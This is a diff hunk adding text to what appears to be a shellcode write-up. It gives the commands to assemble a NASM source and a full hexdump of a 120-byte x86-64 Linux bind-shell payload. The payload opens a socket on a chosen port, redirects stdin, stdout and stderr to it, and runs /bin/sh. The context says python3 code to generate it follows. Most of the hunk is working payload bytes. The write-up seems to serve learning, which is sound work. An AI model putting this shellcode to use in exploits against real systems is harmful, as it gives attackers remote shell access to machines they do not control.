@@ -224,6 +224,20 @@ To decode syscall numbers, i used this: [https://filippo.io/linux-syscall-table/
 
 Ok, now that's demistified a bit, here is a slightly shorter version (it reduces down to 120 bytes) - i guess it can be shortened further, but in this case we already have overflow space to waste: [shell.nasm](shell.nasm). Basically i removed all the unnecessary `xor` instructions and simplified unnecessarily weird pointer creations (like the one at `4000ce`).
 
+To assemble the nasm source, from linux:
+
+	# nasm shell.nasm 
+	# hexdump -C shell
+		00000000  6a 02 5f 6a 01 5e 6a 06  5a 6a 29 58 0f 05 49 89  |j._j.^j.Zj)X..I.|
+		00000010  c0 4d 31 d2 41 52 41 52  c6 04 24 02 66 c7 44 24  |.M1.ARAR..$.f.D$|
+		00000020  02 7a 69 48 89 e6 41 50  5f 6a 10 5a 6a 31 58 0f  |.ziH..AP_j.Zj1X.|
+		00000030  05 41 50 5f 6a 01 5e 6a  32 58 0f 05 48 89 e6 6a  |.AP_j.^j2X..H..j|
+		00000040  10 48 89 e2 41 50 5f 6a  2b 58 0f 05 48 89 c7 6a  |.H..AP_j+X..H..j|
+		00000050  03 5e 48 ff ce 6a 21 58  0f 05 75 f6 48 31 f6 48  |.^H..j!X..u.H1.H|
+		00000060  31 d2 48 bf 2f 2f 62 69  6e 2f 73 68 48 c1 ef 08  |1.H.//bin/shH...|
+		00000070  57 54 5f 6a 3b 58 0f 05                           |WT_j;X..|
+		00000078
+
 
 By concatenating the hex representation of this, leaving the PORT string as a placeholder for the given port, here is the python3 code to generate the shellcode which binds a shell to the given port using a socket:
 
